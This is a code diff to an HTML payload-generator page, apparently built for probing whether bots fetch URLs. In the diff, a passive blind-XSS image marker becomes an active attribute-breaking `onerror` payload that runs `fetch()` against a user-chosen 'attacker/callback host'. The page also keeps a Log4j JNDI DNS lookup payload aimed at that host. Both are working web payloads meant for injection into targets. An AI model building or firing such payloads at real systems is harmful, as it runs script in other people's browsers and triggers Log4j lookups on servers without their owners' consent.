@@ -50,7 +50,7 @@
       <select id="payload">
         <option value="marker">Unique marker</option>
         <option value="cache-bust">Cache-bust marker</option>
-        <option value="blind-xss">Passive blind-XSS image marker</option>
+        <option value="blind-xss">Basic blind-XSS callback</option>
         <option value="log4j-dns">DNS-only Log4j marker</option>
         <option value="custom">Custom template</option>
       </select>
@@ -67,7 +67,7 @@
     <label>Query parameter
       <input id="parameter" value="ai_bot_poc">
     </label>
-    <label>Controlled callback URL/host
+    <label>Controlled attacker/callback host <small>Required for blind XSS and Log4j</small>
       <input id="callback" placeholder="https://callback.example.test">
     </label>
     <label>Custom payload <small>{n}, {target}, {token}, {callback}</small>
@@ -100,19 +100,25 @@
       return Array.from(values, value => alphabet[value % alphabet.length]).join("");
     }
 
-    function callbackHost(value) {
+    function callbackUrl(value) {
       const url = new URL(value.includes("://") ? value : `https://${value}`);
-      if (!url.hostname) throw new Error("The callback must contain a hostname.");
-      return url.hostname;
+      if (!['http:', 'https:'].includes(url.protocol) || !url.hostname)
+        throw new Error("The callback must be an HTTP(S) URL or hostname.");
+      if (url.username || url.password || url.search || url.hash || !['', '/'].includes(url.pathname))
+        throw new Error("The callback must contain only a controlled host and optional port.");
+      return `${url.protocol}//${url.host}`;
+    }
+
+    function callbackHost(value) {
+      return new URL(callbackUrl(value)).hostname;
     }
 
     function payloadFor(kind, n, target, token, callback, custom) {
       if (kind === "marker") return `ai-bot-poc-${token}-${n}`;
       if (kind === "cache-bust") return `cb-${token}-${n}`;
       if (kind === "blind-xss") {
-        const url = new URL(callback);
-        if (!['http:', 'https:'].includes(url.protocol)) throw new Error("The blind-XSS callback must use HTTP(S).");
-        return `<img src="${callback.replace(/\/$/, '')}/ai-bot-poc/${token}/${n}" alt="">`;
+        const beacon = `${callbackUrl(callback)}/ai-bot-poc/${encodeURIComponent(token)}/${n}`;
+        return `"><img src=x onerror="this.onerror=null;fetch('${beacon}',{mode:'no-cors'})">`;
       }
       if (kind === "log4j-dns") return `\${jndi:dns://${callbackHost(callback)}/ai-bot-poc-${token}-${n}}`;
       if (!custom) throw new Error("A custom payload template is required.");
@@ -176,6 +182,15 @@
         byId("error").textContent = error.message;
       }
     });
+
+    function updateCallbackRequirement() {
+      const callback = byId("callback");
+      const needsCallback = ["blind-xss", "log4j-dns"].includes(byId("payload").value);
+      callback.required = needsCallback;
+    }
+
+    byId("payload").addEventListener("change", updateCallbackRequirement);
+    updateCallbackRequirement();
 
     byId("download").addEventListener("click", () => {
       const url = URL.createObjectURL(new Blob([generated], {type: "text/html"}));
